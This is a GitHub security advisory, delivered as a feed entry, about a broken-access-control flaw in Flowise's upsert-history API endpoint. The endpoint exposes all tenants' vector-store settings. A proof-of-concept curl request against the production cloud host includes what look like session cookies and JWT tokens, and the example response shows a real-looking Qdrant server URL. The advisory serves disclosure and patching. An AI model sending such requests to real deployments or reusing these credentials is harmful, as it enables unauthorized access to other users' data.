        <link href="https://github.com/advisories/GHSA-fr6g-7cq8-fg82"/>
        <updated>2026-08-04T17:57:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <strong>GET <code>/api/v1/upsert-history</code></strong> endpoint returns the <strong>entire server-wide upsert history</strong> (response size <strong>&gt;100MB</strong>) instead of being scoped to the requesting user/tenant/workspace. The response includes <strong>sensitive configuration data</strong> (e.g., Vector Store settings such as <strong>Qdrant Server URL</strong> and <strong>collection name</strong>), resulting in a <strong>High severity information disclosure</strong> that may enable further targeted attacks.</p>
<h3 id="details">Details</h3>
<ul>
<li><strong>Affected endpoint:</strong> <code>GET /api/v1/upsert-history</code></li>
<li><strong>Observed behavior:</strong> The API returns <strong>global upsert history for the whole server</strong>, indicating missing/insufficient:<ul>
<li>Authorization checks (RBAC/user-based access control)</li>
<li>Data scoping (workspace/project/tenant isolation)</li>
<li>Pagination/limits (excessive data exposure and very large responses)</li>
</ul>
</li>
<li><strong>Sensitive data exposure:</strong> The returned history contains integration parameters and infrastructure details. Example excerpt from the response:<pre><code class="language-json">{
  "label": "Qdrant",
  "name": "qdrant",
  "category": "Vector Stores",
  "id": "qdrant_0",
  "paramValues": [
    {
      "label": "Qdrant Server URL",
      "name": "qdrantServerUrl",
      "type": "string",
      "value": "https://7f60f255-f7fd-4a1c-a734-fbcf904f9f85.europe-west3-0.gcp.cloud.qdrant.io"
    },
    {
      "label": "Qdrant Collection Name",
      "name": "qdrantCollection",
      "type": "string",
      "value": "fair-herring-azure"
    },
    {
      "label": "Vector Dimension",
      "name": "qdrantVectorDimension",
      "type": "number",
      "value": 1536
    },
    {
      "label": "Content Key",
      "name": "contentPayloadKey",
      "type": "string",
      "value": "content"
    },
    {
      "label": "Metadata Key",
      "name": "metadataPayloadKey",
      "type": "string",
      "value": "metadata"
    },
    {
      "label": "Similarity",
      "name": "qdrantSimilarity",
      "type": "options",
      "value": "Cosine"
    }
  ]
}
</code></pre>
</li>
</ul>
<h3 id="poc">POC</h3>
<ol>
<li>Using <code>curl</code> and call the enpoint <code>GET  /api/v1/upsert-history</code>, sever returns the <strong>entire server-wide upsert history</strong></li>
</ol>
<pre><code>curl 'https://cloud.flowiseai.com/api/v1/upsert-history'   -X GET   -H 'Host: cloud.flowiseai.com'   -H 'Accept: application/json, text/plain, */*'   -H 'Accept-Language: en-US,en;q=0.9'   -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0'   -H 'X-Request-From: internal'   -H 'Referer: https://cloud.flowiseai.com/document-stores/vector/27d7e649-72c9-4333-836f-0a32b7ecda57/719bc75c-5810-4d22-aa03-35c7831b8819'   -H 'If-None-Match: W/"156-Xbc+zqRKlJRZDUydYMybuU4SQnY"'   -H 'Connection: keep-alive'   -H 'Cookie: _ga_DG9QMLV4DR=GS2.1.s1773632276$o1$g0$t1773632915$j60$l0$h0; _ga=GA1.1.938844242.1773632276; cf_clearance=Ug4PTMCbO8G.9n7ibaRBT.Y74flswLTgbR6V4qQbKUE-1773715307-1.2.1.1-2XGkql2bE8imFOsQJuw0x8yM9XW7QWbEe8ALEZ39Bm03kZu.vJLusY5_cRurAooKcK0XuqTjWgibQXYwWF91LbQZIXFefNzXuz6f8O7VzY5VM_h9p0_xICarIdDdB0hWfriItN1qbu00tqEmDgE_v2biNpNETXF3nC0wByJmhNWOcSh95lBd_Q5vALJQ0hc7pzhbPh.OuLbLtcCOlEv1YbwZWMSynj3hglpCeVkWqkM; connect.sid=s%3Axrkhl0YSNjvydmo24ASe3ezLStuedRCv.JABLEZmfWP74D9zGvFyDEELHFXqvDxHRnN3mJBhsKX8; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..UDFurQPA6-bKQ7mZg0Qetu6yAv1UK3vaz27ZUhUoamc; refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..0HlslRzoFo0Tlt4Jbn9gnEwsQej4ilMd8qjhLBZQO5Q; __cf_bm=.BG97WtFqwwk0DMVJB1BlcHRdhQv70bLu4f_QpH5qo4-1773721030-1.0.1.1-IwhUPW6O9uNcNsOZl7LLgpnm8_ll18rzoOFu085wZQQgTvVvaPwVFJObxSJ1.NRyS5MWsRbJi1BhUNMTJjSR2s9EyuSBzn2s_eXblq8rTh8'   --compressed   -sS -o resp.json
</code></pre>
<ol start="2">
<li>Verify the response size (expected: very large, e.g., &gt;100MB)</li>
</ol>
<pre><code>ls -lh resp.json
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Vulnerability type:</strong> Information Disclosure / Broken Access Control (missing authorization and/or missing tenant/workspace scoping)</li>
<li><strong>Who is impacted:</strong> All users/tenants/workspaces whose upsert history and configuration data are included in the server-wide history</li>
<li><strong>Security consequences:</strong><ul>
<li>Exposure of infrastructure/integration details (e.g., Qdrant endpoint URLs, collection names, vector dimensions), enabling reconnaissance and targeted follow-up attacks</li>
<li>Leakage of internal schema/pipeline details (e.g., content/metadata keys)</li>
<li>Potential resource abuse: repeated downloads of a &gt;100MB response can increase bandwidth/CPU/memory load (amplifying DoS risk)</li>
</ul>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-fr6g-7cq8-fg82">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-fr6g-7cq8-fg82</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/pull/6170">https://github.com/FlowiseAI/Flowise/pull/6170</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/commit/d81483b70c997ddf981acc9c49fbd9a02fa345cd">https://github.com/FlowiseAI/Flowise/commit/d81483b70c997ddf981acc9c49fbd9a02fa345cd</a></li>
<li><a href="https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3">https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-fr6g-7cq8-fg82">https://github.com/advisories/GHSA-fr6g-7cq8-fg82</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fr6g-7cq8-fg82</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-04T17:57:27.000Z</published>
    </entry>
</feed>